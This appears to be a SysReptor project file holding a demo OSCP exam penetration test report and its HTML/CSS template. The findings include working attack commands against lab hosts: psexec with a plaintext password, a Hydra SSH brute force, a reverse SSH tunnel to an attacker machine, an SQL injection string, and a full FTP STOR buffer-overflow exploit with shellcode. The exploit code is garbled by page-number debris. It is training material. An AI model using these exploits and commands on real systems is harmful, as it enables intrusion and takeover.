@@ -1,0 +1,1244 @@
+format = "projects/v1"
+id = "d03d7feb-a9c8-43b2-bbc2-7d72849db78c"
+name = "OSCP Exam Report Demo"
+language = "en-US"
+tags = []
+members = []
+
+[[sections]]
+id = "Student"
+status = "finished"
+
+[[sections]]
+id = "methodology"
+status = "finished"
+
+[[sections]]
+id = "other"
+status = "finished"
+
+[[sections]]
+id = "appendix"
+status = "finished"
+
+[[sections]]
+id = "high-level_summary"
+status = "finished"
+
+[[images]]
+id = "f6f34754-6f17-418e-9438-3266553143c4"
+name = "grafik-5838.jpg"
+
+[[images]]
+id = "193d3d1d-131c-4743-8f8a-a37e87beaddc"
+name = "grafik-88002.jpg"
+
+[[images]]
+id = "701b903a-732b-41a9-8d91-4c0147196406"
+name = "grafik-18239.jpg"
+
+[[images]]
+id = "760def8a-1afa-4d2c-9c1d-46fd6fe50eaf"
+name = "grafik-96640.jpg"
+
+[[images]]
+id = "fb860a02-479b-418e-854a-cb3748be8445"
+name = "grafik-54644.jpg"
+
+[[images]]
+id = "4ea665ae-774f-49ca-826f-4935e57d0d8c"
+name = "grafik-58203.jpg"
+
+[[images]]
+id = "3655b982-ae06-4b2f-b018-e47205f33b35"
+name = "grafik-32877.jpg"
+
+[[images]]
+id = "d36ccafe-325f-4771-a466-8253564dfdcc"
+name = "grafik-5026.jpg"
+
+[[images]]
+id = "d552ec96-cea9-4c0c-9c1a-e7d02e00336e"
+name = "grafik-48948.jpg"
+
+[[images]]
+id = "b25436de-f331-410a-9398-5825c0c58e52"
+name = "grafik-40126.jpg"
+
+[[images]]
+id = "3acc6915-6c30-4cbd-89c5-3ef2719cdca2"
+name = "grafik.jpg"
+
+[report_data]
+title = "OSCP Exam Report Demo"
+mail = "student@example.com"
+osid = "OS-XXXXX"
+watermark = false
+methodology = "John recommends patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date."
+penetration = "The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems. During this penetration test, John was able to successfully gain access to 10 out of the 50 systems."
+report_date = "2022-12-31"
+serviceenum = "The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable for an attacker as it provides detailed information on potential attack vectors into a system. Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test.  In some cases, some ports may not be listed."
+housecleaning = """
+The house cleaning portions of the assessment ensures that remnants of the penetration test are removed. Often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road. Ensuring that we are meticulous and no remnants of our penetration test are left over is important.
+
+After the trophies on both the lab network and exam network were completed, John removed all user accounts and passwords as well as the Meterpreter services installed on the system. Offensive Security should not have to remove any user accounts or services from the system.
+"""
+infogathering = """
+The information gathering portion of a penetration test focuses on identifying the scope of the penetration test. During this penetration test, John was tasked with exploiting the lab and exam network. The specific IP addresses were:
+
+**Exam Network:**
+
+* 172.16.203.133
+* 172.16.203.134
+* 172.16.203.135
+* 172.16.203.136
+"""
+maintainaccess = """
+Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable. The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again. Many exploits may only be exploitable once and we may never be able to get back into a system after we have already performed the exploit. 
+
+John added administrator and root level accounts on all systems compromised. In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to ensure that additional access could be established.
+"""
+report_version = "1.0"
+recommendations = "John recommends patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date."
+appendix_sections = []
+highlevel_summary = """
+John Doe was tasked with performing an internal penetration test towards Offensive Security Labs. An internal penetration test is a dedicated attack against internally connected systems. The focus of this test is to perform attacks, similar to those of a hacker and attempt to infiltrate Offensive Security’s internal lab systems – the THINC.local domain. John’s overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to Offensive Security.
+
+When performing the internal penetration test, there were several alarming vulnerabilities that were identified on Offensive Security’s network. When performing the attacks, John was able to gain access to multiple machines, primarily due to outdated patches and poor security configurations.  During the testing, John had administrative level access to multiple systems. All systems were successfully exploited and access granted.
+"""
+lastname = "Doe"
+firstname = "John"
+
+[[findings]]
+id = "7d9c0db2-888c-4b03-a5e5-88cdc0684d63"
+status = "finished"
+
+[findings.data]
+title = "DC"
+cvss = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
+ip_address = "10.5.5.30"
+serviceenum = """
+**Port Scan Results**
+
+| IP Address | Ports Open |
+| ------- | ------- |
+| 10.5.5.30   | **TCP:** 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 3389 |
+"""
+initialaccess = """
+**Steps to reproduce the attack:** John was able to reuse a temporary password that the administrator left for Alex.
+
+```
+proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py admin:UWyBGeTp3Bhw7f@10.5.5.30
+```
+
+![Screenshot](/images/name/grafik-88002.jpg)
+"""
+postexploitation = """
+**System Proof Screenshot:**
+![Proof](/images/name/grafik-5838.jpg)
+"""
+isActiveDirectory = true
+privilegeescalation = ""
+hostname = "TODO: fill field in report"
+
+[[findings]]
+id = "d4acc7d2-2a2a-4e50-8f7f-54415a8d47d0"
+status = "finished"
+
+[findings.data]
+title = "Poultry"
+cvss = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
+ip_address = "10.5.5.20"
+serviceenum = """
+**Port Scan Results**
+
+| IP Address | Ports Open |
+| ------- | ------- |
+| 10.5.5.20   | **TCP:** 135, 139, 445, 3389 |
+"""
+initialaccess = """
+**Steps to reproduce the attack:** with the credentials at hand and a reverse tunnel established, John connected to an RDP session using proxychains accepting the certificate when prompted and entering the retrieved password afterward.
+
+```
+proxychains xfreerdp /d:sandbox /u:alex /v:10.5.5.20 +clipboard
+```
+"""
+postexploitation = """
+**Local Proof Screenshot:** 
+![Proof](/images/name/grafik-96640.jpg)
+
+John noticed the presence of the Thunderbird program on the user’s desktop, and while checking Alex’s inbox he found the email from a local administrator Roger:
+
+![Screenshot](/images/name/grafik-18239.jpg)
+"""
+isActiveDirectory = true
+privilegeescalation = ""
+hostname = "TODO: fill field in report"
+
+[[findings]]
+id = "a62710d4-3c47-4e4b-826c-35b581ac47fd"
+status = "finished"
+
+[findings.data]
+title = "Ajla"
+cvss = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
+ip_address = "10.4.4.10"
+serviceenum = """
+**Port Scan Results**
+
+| IP Address | Ports Open |
+| ------- | ------- |
+| 10.4.4.10   | **TCP:** 22, 80 |
+"""
+initialaccess = """
+**Vulnerability Explanation:** The user account on the Ajla host was protected by a trivial password that was cracked within 5 minutes of brute-forcing.
+
+**Vulnerability Fix:** The SSH service should be configured to not accept password-based logins and the user account itself should contain a unique password not contained in the publicly available wordlists.
+
+**Steps to reproduce the attack:** om the initial service scan John discovered that this host is called Ajla. After adding the target’s IP to the /etc/hosts file, the Hydra tool was run against the SSH service using the machine’s DNS name instead of its IP. With the extracted password at hand John was able to log in as ajla using SSH.
+
+```
+hydra -l ajla -P /home/kali/rockyou.txt -T 20 sandbox.local ssh
+```
+
+![Screenshot](/images/name/grafik-5026.jpg)
+"""
+postexploitation = """
+**System Proof Screenshot:**
+
+![](/images/name/grafik-58203.jpg)
+
+After collecting the proof files and establishing a backdoor using SSH, John began the enumeration of the filesystem for the presence of interesting files. He noticed that there was a mounted share originating from the 10.5.5.20 IP. Inspecting a custom sysreport.ps1 script in the /mnt/scripts directory he found cleartext credentials for the “sandbox\\alex” user. Taking into consideration the type of scripts in this directory and the username structure, it seems that the “Poultry” host is a part of the Active Directory environment.
+
+![](/images/name/grafik-54644.jpg)
+
+John began the lateral movement by establishing a reverse dynamic port forwarding using SSH. First, he generated a new pair of SSH keys and added those to the authorized_keys file on his Kali VM, then he just needed to issue a single SSH port forwarding command:
+
+```
+ssh-keygen -t rsa -N ‘’ -f ~/.ssh/key
+ssh -f -N -R 1080 -o “UserKnownHostsFile=/dev/null” -o “StrictHostKeyChecking=no” -I key kali@192.168.119.164
+```
+
+With the dynamic reverse tunnel established, John only needed to edit the /etc/proxychains.conf to use the port 1080.
+"""
+isActiveDirectory = true
+privilegeescalation = """
+**Vulnerability Explation:** sudo group allows any user in this group to escalate privileges to the root if
+they know the user’s password.
+
+**Vulnerability Fix:** The SSH service should be configured to not accept password-based logins and the user account itself should contain a unique password not contained in the publicly available wordlists.
+
+**Steps to reproduce the attack:** John spotted that the ajla user was a member of the sudo group immediately upon logging in and using the “id” command. And knowing user’s password, he only needed to use a single command “sudo su” in order to obtain a root shell.
+
+![Screenshot](/images/name/grafik-32877.jpg)
+"""
+hostname = "TODO: fill field in report"
+
+[[findings]]
+id = "2736e064-c217-4a29-a136-35af9a219ef3"
+status = "finished"
+
+[findings.data]
+title = "Target #1"
+cvss = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+ip_address = "172.16.203.134"
+serviceenum = """
+**Port Scan Results**
+
+| IP Address | Ports Open |
+| ------- | ------- |
+| 172.16.203.134  | **TCP:** 22, 79, 80, 105, 106, 110, 135, 139, 143, 445, 2224, 3306, 3389 |
+
+**FTP Enumeration**
+Upon manual enumeration of the available FTP service, John noticed it was running an outdated version 2.3.4 that is prone to the remote buffer overflow vulnerability.
+"""
+initialaccess = """
+**Vulnerability Explanation:** Ability Server 2.34 is subject to a buffer overflow vulnerability in STOR field. Attackers can use this vulnerability to cause arbitrary remote code execution and take completely control over the system.
+
+**Vulnerability Fix:** The publishers of the Ability Server have issued a patch to fix this known issue. It can be found here: [http://www.code-crafters.com/abilityserver/](http://www.code-crafters.com/abilityserver/)
+
+**Steps to reproduce the attack:** The operating system was different from the known public exploit. A rewritten exploit was needed in order for successful code execution to occur. Once the exploit was rewritten, a targeted attack was performed on the system which gave John full administrative access over the system.
+
+**Proof of Concept Code:**
+```python
+###################################
+# Ability Server 2.34 FTP STOR Buffer Overflow # Advanced, secure and easy to use FTP Server. # 21 Oct 2004 - muts ###################################
+# D:\\BO>ability-2.34-ftp-stor.py ###################################
+# D:\\data\\tools>nc -v 127.0.0.1 4444
+# localhost [127.0.0.1] 4444 (?) open
+# Microsoft Windows XP [Version 5.1.2600]
+# (C) Copyright 1985-2001 Microsoft Corp.
+# D:\\Program Files\\abilitywebserver> ###################################
+import ftplib
+from ftplib import FTP
+import struct
+print "\\n\\n################################"
+print "\\nAbility Server 2.34 FTP STOR buffer Overflow" print "\\nFor Educational Purposes Only!\\n"
+print "###################################"
+# Shellcode taken from Sergio Alvarez's "Win32 Stack Buffer Overflow Tutorial"
+sc = "\\xd9\\xee\\xd9\\x74\\x24\\xf4\\x5b\\x31\\xc9\\xb1\\x5e\\x81\\x73\\x17\\xe0\\x66"
+ 8 | Page
+   sc += "\\x1c\\xc2\\x83\\xeb\\xfc\\xe2\\xf4\\x1c\\x8e\\x4a\\xc2\\xe0\\x66\\x4f\\x97\\xb6" sc += "\\x1a\\x38\\xd6\\x95\\x87\\x97\\x98\\xc4\\x67\\xf7\\xa4\\x6b\\x6a\\x57\\x49\\xba" sc += "\\x7a\\x1d\\x29\\x6b\\x62\\x97\\xc3\\x08\\x8d\\x1e\\xf3\\x20\\x39\\x42\\x9f\\xbb" sc += "\\xa4\\x14\\xc2\\xbe\\x0c\\x2c\\x9b\\x84\\xed\\x05\\x49\\xbb\\x6a\\x97\\x99\\xfc" sc += "\\xed\\x07\\x49\\xbb\\x6e\\x4f\\xaa\\x6e\\x28\\x12\\x2e\\x1f\\xb0\\x95\\x05\\x61" sc += "\\x8a\\x1c\\xc3\\xe0\\x66\\x4b\\x94\\xb3\\xef\\xf9\\x2a\\xc7\\x66\\x1c\\xc2\\x70" sc += "\\x67\\x1c\\xc2\\x56\\x7f\\x04\\x25\\x44\\x7f\\x6c\\x2b\\x05\\x2f\\x9a\\x8b\\x44" sc += "\\x7c\\x6c\\x05\\x44\\xcb\\x32\\x2b\\x39\\x6f\\xe9\\x6f\\x2b\\x8b\\xe0\\xf9\\xb7" sc += "\\x35\\x2e\\x9d\\xd3\\x54\\x1c\\x99\\x6d\\x2d\\x3c\\x93\\x1f\\xb1\\x95\\x1d\\x69" sc += "\\xa5\\x91\\xb7\\xf4\\x0c\\x1b\\x9b\\xb1\\x35\\xe3\\xf6\\x6f\\x99\\x49\\xc6\\xb9" sc += "\\xef\\x18\\x4c\\x02\\x94\\x37\\xe5\\xb4\\x99\\x2b\\x3d\\xb5\\x56\\x2d\\x02\\xb0" sc += "\\x36\\x4c\\x92\\xa0\\x36\\x5c\\x92\\x1f\\x33\\x30\\x4b\\x27\\x57\\xc7\\x91\\xb3" sc += "\\x0e\\x1e\\xc2\\xf1\\x3a\\x95\\x22\\x8a\\x76\\x4c\\x95\\x1f\\x33\\x38\\x91\\xb7" sc += "\\x99\\x49\\xea\\xb3\\x32\\x4b\\x3d\\xb5\\x46\\x95\\x05\\x88\\x25\\x51\\x86\\xe0" sc += "\\xef\\xff\\x45\\x1a\\x57\\xdc\\x4f\\x9c\\x42\\xb0\\xa8\\xf5\\x3f\\xef\\x69\\x67" sc += "\\x9c\\x9f\\x2e\\xb4\\xa0\\x58\\xe6\\xf0\\x22\\x7a\\x05\\xa4\\x42\\x20\\xc3\\xe1" sc += "\\xef\\x60\\xe6\\xa8\\xef\\x60\\xe6\\xac\\xef\\x60\\xe6\\xb0\\xeb\\x58\\xe6\\xf0" sc += "\\x32\\x4c\\x93\\xb1\\x37\\x5d\\x93\\xa9\\x37\\x4d\\x91\\xb1\\x99\\x69\\xc2\\x88" sc += "\\x14\\xe2\\x71\\xf6\\x99\\x49\\xc6\\x1f\\xb6\\x95\\x24\\x1f\\x13\\x1c\\xaa\\x4d" sc += "\\xbf\\x19\\x0c\\x1f\\x33\\x18\\x4b\\x23\\x0c\\xe3\\x3d\\xd6\\x99\\xcf\\x3d\\x95" sc += "\\x66\\x74\\x32\\x6a\\x62\\x43\\x3d\\xb5\\x62\\x2d\\x19\\xb3\\x99\\xcc\\xc2"
+# Change RET address if need be.
+buffer = '\\x41'*966+struct.pack('<L', 0x7C2FA0F7)+'\\x42'*32+sc # RET Windows 2000 Server SP4
+#buffer = '\\x41'*970+struct.pack('<L', 0x7D17D737)+'\\x42'*32+sc # RET Windows XP SP2 try:
+# Edit the IP, Username and Password.
+    9 | Page
+
+ 
+ftp = FTP('127.0.0.1')
+ftp.login('ftp','ftp')
+print "\\nEvil Buffer sent..."
+print "\\nTry connecting with netcat to port 4444 on the remote machine." except:
+print "\\nCould not Connect to FTP Server."
+try:
+ftp.transfercmd("STOR " + buffer)
+except:
+print "\\nDone."
+```
+"""
+postexploitation = """
+**System Proof Screenshot:**
+![Proof](/images/name/grafik-48948.jpg)
+"""
+isActiveDirectory = false
+privilegeescalation = """
+**Vulnerability Explation:** After establishing a foothold on target, John noticed there were several applications running locally, one of them, a custom web application on port 80 was prone to SQL Injection attacks. Using Chisel for port forwarding, John was able to access the web application. When performing the penetration test, John noticed error-based MySQL Injection on the taxid query string parameter. While enumerating table data, John was able to successfully extract the database root account login and password credentials that were unencrypted that also matched username and password accounts for the administrative user account on the system and John was able to log in remotely using RDP. This allowed for a successful breach of the operating system as well as all data contained on the system.
+
+**Vulnerability Fix:** Since this is a custom web application, a specific update will not properly solve this issue. The application will need to be programmed to properly sanitize user-input
+data, ensure that the user is running off of a limited user account, and that any sensitive data stored within the SQL database is properly encrypted. Custom error messages are highly recommended, as it becomes more challenging for the attacker to exploit a given weakness if errors are not being presented back to them.
+
+**Steps to reproduce the attack:**
+```
+SELECT * FROM login WHERE id = 1 or 1=1 AND user LIKE “%root%"
+```
+
+**Screenshot:** 
+![Screenshot](/images/name/grafik-40126.jpg)
+"""
+hostname = "TODO: fill field in report"
+
+[project_type]
+format = "projecttypes/v1"
+id = "83463520-fddb-4265-a7c7-2deb4c4898f2"
+name = "OSCP Exam Report v1.1"
+language = "en-US"
+finding_field_order = [
+    "title",
+    "ip_address",
+    "isActiveDirectory",
+    "cvss",
+    "serviceenum",
+    "initialaccess",
+    "privilegeescalation",
+    "postexploitation",
+]
+report_template = """
+<div id="footer" data-sysreptor-generated="page-footer">
+    <div id="footer-left"><em>CONFIDENTIAL</em></div>
+    <div id="footer-center">{{ report.title }}</div>
+</div>
+
+<div v-if="report.watermark" id="watermark-osid">{{ report.osid }}</div>
+
+
+
+<section id="page-cover" data-sysreptor-generated="page-cover">
+    <div id="page-cover-background" />
+    <div id="page-cover-title">
+        <h1>Offensive Security</h1>
+        <h2>{{ report.title }}</h2>
+    </div>
+
+    <div id="page-cover-student">
+        <p id="page-cover-osid">
+            <strong>OSID: {{ report.osid }}</strong><br>
+            {{ report.mail }}<br>
+        </p>
+        <p id="page-cover-meta">
+            {{ formatDate(report.report_date, 'long') }}<br>
+            v{{ report.report_version }}
+        </p>
+    </div>
+
+</section>
+<pagebreak />
+
+
+
+<table-of-contents id="toc" v-slot="tocItems">
+    <h1>Table of Contents</h1>
+    <ul>
+        <li v-for="item in tocItems" :class="'toc-level' + item.level">
+            <ref :to="item.id" />
+        </li>
+    </ul>
+    <pagebreak />
+</table-of-contents>
+
+<markdown>
+    # Offensive Security OSCP Exam Penetration Test Report {.in-toc.numbered}
+
+    ## Introduction {.in-toc .numbered}
+    The Offensive Security Lab and Exam penetration test report contains all efforts that were conducted in order to pass the Offensive Security course. This report should contain all items that were used to pass the overall exam and it will be graded from a standpoint of correctness and fullness to all aspects of the exam. The purpose of this report is to ensure that the student has a full understanding of penetration testing methodologies as well as the technical knowledge to pass the qualifications for the Offensive Security Certified Professional.
+
+    ## Objective {.in-toc.numbered}
+    The objective of this assessment is to perform an internal penetration test against the Offensive Security Lab and Exam network. The student is tasked with following methodical approach in obtaining access to the objective goals. This test should simulate an actual penetration test and how you would start from beginning to end, including the overall report. An ex-ample page has already been created for you at the latter portions of this document that should give you ample information on what is expected to pass this course. Use the sample report as a guideline to get you through the reporting.
+
+    ## Requirements {.in-toc.numbered}
+    The student will be required to fill out this penetration testing report fully and to include the following sections:
+    * Overall High-Level Summary and Recommendations (non-technical)
+    * Methodology walkthrough and detailed outline of steps taken
+    * Each finding with included screenshots, walkthrough, sample code, and proof.txt if applicable.
+    * Any additional items that were not included
+</markdown>
+<pagebreak />
+
+
+<section>
+    <h1 id="summary" class="in-toc numbered">High-Level Summary</h1>
+    <markdown v-if="report.highlevel_summary" :text="report.highlevel_summary" />
+
+    <div v-if="report.recommendations">
+        <h2 id="recommendations" class="in-toc numbered">Recommendations</h2>
+        <markdown :text="report.recommendations" />
+    </div>
+
+    <div>
+        <h2 id="finding-summary" class="in-toc numbered">Identified Vulnerabilities</h2>
+        <p>
+            In the course of this penetration test
+            <comma-and-join>
+                <template #critical v-if="finding_stats.count_critical > 0"><strong class="risk-critical">{{ finding_stats.count_critical }} Critical</strong></template>
+                <template #high v-if="finding_stats.count_high > 0"><strong class="risk-high">{{ finding_stats.count_high }} High</strong></template>
+                <template #medium v-if="finding_stats.count_medium > 0"><strong class="risk-medium">{{ finding_stats.count_medium }} Medium</strong></template>
+                <template #low v-if="finding_stats.count_low > 0"><strong class="risk-low">{{ finding_stats.count_low }} Low</strong></template>
+                <template #info v-if="finding_stats.count_info > 0"><strong class="risk-info">{{ finding_stats.count_info }} Info</strong></template>
+            </comma-and-join>
+            vulnerabilities were identified:
+        </p>
+        <table>
+            <thead>
+                <tr>
+                    <th>Target Name</th>
+                    <th>IP</th>
+                    <th align="center">CVSS</th>
+                    <th align="center">Page</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr v-for="finding in findings" class="table-row-link">
+                    <td><ref :to="finding.id">{{ finding.title }}</ref></td>
+                    <td><ref :to="finding.id">{{ finding.ip_address }}</ref></td>
+                    <td align="center" :class="'risk-bg-' + finding.cvss.level"><ref :to="finding.id">{{ finding.cvss.score }}</ref></td>
+                    <td align="center"><ref :to="finding.id" class="ref-page" /></td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+</section>
+<pagebreak />
+
+<section>
+    <h1 class="in-toc numbered">Methodologies</h1>
+    <markdown :text="report.methodology" />
+
+    <h2 class="in-toc numbered">Information Gathering</h2>
+    <markdown :text="report.infogathering" />
+
+    <h2 class="in-toc numbered">Service Enumeration</h2>
+    <markdown :text="report.serviceenum" />
+
+    <h2 class="in-toc numbered">Penetration</h2>
+    <markdown :text="report.penetration" />
+
+    <h2 class="in-toc numbered">Maintaining Access</h2>
+    <markdown :text="report.maintainaccess" />
+
+    <h2 class="in-toc numbered">House Cleaning</h2>
+    <markdown :text="report.housecleaning" />
+</section>
+<pagebreak />
+
+<section v-if="findings.some(f => !f.isActiveDirectory)">
+    <h1 id="findings" class="in-toc numbered">Independent Challenges</h1>
+    <div v-for="finding in findings.filter(f => !f.isActiveDirectory)">
+        <h2 :id="finding.id" class="in-toc numbered">{{ finding.title }} ({{ finding.ip_address }})</h2>
+        <table class="finding-heading">
+            <tr>
+                <td class="table-key">Score:</td>
+                <td align="center" :class="'risk-bg-' + finding.cvss.level">
+                    {{ finding.cvss.score}} ({{ lodash.capitalize(finding.cvss.level) }})
+                </td>
+            </tr>
+            <tr>
+                <td class="table-key">Vector:</td>
+                <td>{{ finding.cvss.vector || 'n/a' }}</td>
+            </tr>
+        </table>
+
+        <div v-if="finding.serviceenum">
+            <h3 class="in-toc numbered">Service Enumeration</h3>
+            <markdown :text="finding.serviceenum" />
+        </div>
+        <div v-if="finding.initialaccess">
+            <h3 class="in-toc numbered">Initial Access</h3>
+            <markdown :text="finding.initialaccess" />
+        </div>
+
+        <div v-if="finding.privilegeescalation">
+            <h3 class="in-toc numbered">Privilege Escalation</h3>
+            <markdown :text="finding.privilegeescalation" />
+        </div>
+
+        <div v-if="finding.postexploitation">
+            <h3 class="in-toc numbered">Post-Exploitation</h3>
+            <markdown :text="finding.postexploitation" />
+        </div>
+        <pagebreak />
+    </div>
+</section>
+
+<section v-if="findings.some(f => f.isActiveDirectory)">
+    <h1 id="findingsad" class="in-toc numbered">Active Directory Set</h1>
+    <div v-for="finding in findings.filter(f => f.isActiveDirectory)">
+        <h2 :id="finding.id" class="in-toc numbered">{{ finding.title }} ({{ finding.ip_address }})</h2>
+        <table class="finding-heading">
+            <tr>
+                <td class="table-key">Score:</td>
+                <td align="center" :class="'risk-bg-' + finding.cvss.level">
+                    {{ finding.cvss.score}} ({{ lodash.capitalize(finding.cvss.level) }})
+                </td>
+            </tr>
+            <tr>
+                <td class="table-key">Vector:</td>
+                <td>{{ finding.cvss.vector || 'n/a' }}</td>
+            </tr>
+        </table>
+
+        <div v-if="finding.serviceenum">
+            <h3 class="in-toc numbered">Service Enumeration</h3>
+            <markdown :text="finding.serviceenum" />
+        </div>
+        <div v-if="finding.initialaccess">
+            <h3 class="in-toc numbered">Initial Access</h3>
+            <markdown :text="finding.initialaccess" />
+        </div>
+
+        <div v-if="finding.privilegeescalation">
+            <h3 class="in-toc numbered">Privilege Escalation</h3>
+            <markdown :text="finding.privilegeescalation" />
+        </div>
+
+        <div v-if="finding.postexploitation">
+            <h3 class="in-toc numbered">Post-Exploitation</h3>
+            <markdown :text="finding.postexploitation" />
+        </div>
+        <pagebreak />
+    </div>
+</section>
+
+<section v-if="report.appendix_sections.length > 0" class="appendix">
+    <h1 id="appendix" class="in-toc numbered">Appendix</h1>
+
+    <div v-for="appendix_section in report.appendix_sections">
+        <h2 class="in-toc numbered">{{ appendix_section.title }}</h2>
+        <markdown :text="appendix_section.content" />
+    </div>
+    <pagebreak />
+</section>
+
+<section>
+    <div class="end-of-report">
+        End of Report<br>
+    </div>
+    <div class="end-of-report">
+        This report was rendered<br>
+        by <a href="https://docs.sysreptor.com/">SysReptor</a> with<br>
+        <span style="color:red;">&hearts;</span><br>
+    </div>
+</section>
+"""
+report_styles = """
+@import "/assets/global/base.css";
+
+/* Define variables */
+:root {
+    --color-risk-critical: #E83221;
+    --color-risk-high: #FF9300;
+    --color-risk-medium: #FFDA00;
+    --color-risk-low: #4285F5;
+    --color-risk-info: #00AE51;
+}
+
+/* Font settings */
+html {
+    font-family: "Noto Sans", sans-serif;
+    font-size: 10pt;
+}
+
+
+/* Global styles */
+@page {
+    size: A4 portrait;
+    margin: 35mm 20mm 25mm 20mm;
+}
+
+a {
+    font-style: italic;
+    text-decoration: none;
+    color: inherit;
+}
+
+pre code {
+    border: 1px solid black;
+    padding: 0.2em !important;
+}
+code {
+    background-color: rgb(221, 221, 221);
+}
+
+th {
+    background-color: #ABABAB;
+    font-weight: bold;
+}
+tr.table-row-link td {
+    padding: 0;
+}
+tr.table-row-link td a {
+    display: block;
+    padding: 0.3em;
+    color: inherit;
+    text-decoration: none;
+    font-style: inherit;
+}
+.table-key {
+    background-color: #ABABAB;
+}
+
+
+/* Classes for risk colors */
+.risk-critical { color: var(--color-risk-critical) !important; font-weight: bold; }
+.risk-high { color: var(--color-risk-high) !important; font-weight: bold; }
+.risk-medium { color: var(--color-risk-medium) !important; font-weight: bold; }
+.risk-low { color: var(--color-risk-low) !important; font-weight: bold; }
+.risk-info { color: var(--color-risk-info) !important; font-weight: bold; }
+
+.risk-bg-critical { background-color: var(--color-risk-critical) !important; color: white !important; }
+.risk-bg-high { background-color: var(--color-risk-high) !important; }
+.risk-bg-medium { background-color: var(--color-risk-medium) !important; }
+.risk-bg-low { background-color: var(--color-risk-low) !important; }
+.risk-bg-info { background-color: var(--color-risk-info) !important; }
+
+/* Helper class for referencing page number */
+.ref-page::before { 
+    content: "" !important;
+}
+.ref-page::after {
+  content: target-counter(attr(href), page) !important;
+}
+.ref-page .ref-title {
+  display: none !important;
+}
+
+/* Table in finding chapters */
+.finding-heading .table-key {
+    height: 3em;
+    width: 10em;
+}
+
+
+.end-of-report {
+    text-align:center;
+    font-style:italic;
+    margin-top:70px;
+    line-height:1.7;
+}
+
+
+
+
+
+/* #region footer */
+@page {
+    @bottom-left { content: element(footer-left); }
+    @bottom-center { content: element(footer-center); }
+    @bottom-right-corner { content: counter(page); }
+}
+#footer #footer-left { position: running(footer-left); }
+#footer #footer-center { position: running(footer-center); }
+/* #endregion footer */
+
+/* #region watermark */
+#watermark-osid {
+    position: fixed;
+    top: 9cm;
+    left: 1cm;
+    transform: rotate(-45deg);
+    font-size: 90pt;
+    text-transform: uppercase;
+    opacity: 0.2;
+}
+/* #endregion watermark */
+
+/* #region page-cover */
+@page :first {
+    /* Footer on the cover page */
+    @bottom-right-corner {
+        content: "";
+    }
+    @bottom-right {
+        /* Page number */
+        content: counter(page);
+        font-size: 9pt;
+        color: white
+    }
+    @bottom-left {
+        content: "Confidential";
+        text-transform: uppercase;
+        font-style: italic;
+        color: white;
+    }
+     /* Pentest title should not appear on cover page */
+    @bottom-center {
+        content: '';
+    }
+}
+#page-cover-background{
+    position: absolute;
+    margin-top: -35mm;
+    margin-left: -20mm;
+    width: 210mm;
+    height: 297mm;
+    background-color: #E83221;
+}
+/* Title page elements */
+#page-cover-title {
+    position: absolute;
+    top: 20mm;
+    left: 0;
+    width: 14cm;
+    color: #ffffff;
+}
+#page-cover-title h1 {
+    font-size: 32pt;
+}
+#page-cover-title h2 {
+    font-size: 24pt;
+}
+#page-cover-student {
+    position: absolute;
+    top: 11cm;
+    left: 0;
+    width: 14cm;
+    color: #ffffff;
+}
+#page-cover-osid {
+    font-size: 14pt;
+}
+#page-cover-meta {
+    line-height: 2em;
+}
+/* #endregion page-cover */
+
+/* #region toc */
+#toc li {
+  list-style: none;
+  margin: 0;
+  padding: 0;
+}
+#toc .ref::before {
+    padding-right: 0.5em;
+}
+#toc .ref::after {
+    content: " " leader(".") " " target-counter(attr(href), page);
+}
+#toc .toc-level1 {
+  font-size: 1.5rem;
+  font-weight: bold;
+  margin-top: 0.8rem;
+}
+#toc .toc-level2 {
+  font-size: 1.2rem;
+  font-weight: bold;
+  margin-top: 0.5rem;
+  margin-left: 2rem;
+}
+#toc .toc-level3 {
+  font-size: 1rem;
+  margin-top: 0.4rem;
+  margin-left: 4rem;
+}
+#toc .toc-level4 {
+  font-size: 1rem;
+  margin-top: 0;
+  margin-left: 6rem;
+}
+/* #endregion toc */
+"""
+
+[project_type.report_fields]
+[project_type.report_fields.title]
+type = "string"
+label = "Title"
+origin = "core"
+default = "OSCP Penetration Test Report"
+required = true
+spellcheck = true
+
+[project_type.report_fields.mail]
+type = "string"
+label = "Mail"
+origin = "custom"
+default = "student@example.com"
+required = true
+spellcheck = false
+
+[project_type.report_fields.osid]
+type = "string"
+label = "OSID"
+origin = "custom"
+default = "XXXXX"
+required = true
+spellcheck = false
+
+[project_type.report_fields.lastname]
+type = "string"
+label = "lastname"
+origin = "custom"
+default = "Doe"
+required = true
+spellcheck = false
+
+[project_type.report_fields.firstname]
+type = "string"
+label = "firstname"
+origin = "custom"
+default = "John"
+required = true
+spellcheck = false
+
+[project_type.report_fields.watermark]
+type = "boolean"
+label = "Watermark"
+origin = "custom"
+default = false
+
+[project_type.report_fields.methodology]
+type = "markdown"
+label = "Methodologies"
+origin = "custom"
+default = """
+{{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) utilized a widely adopted approach to perform penetration testing that is effective in testing how well the Offensive Security Labs and Exam environments are secure. Below is a breakout of how {{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) was able to identify and exploit the variety of systems and includes all individual vulnerabilities found.
+
+TODO Adapt as required
+"""
+required = true
+
+[project_type.report_fields.penetration]
+type = "markdown"
+label = "Penetration"
+origin = "custom"
+default = """
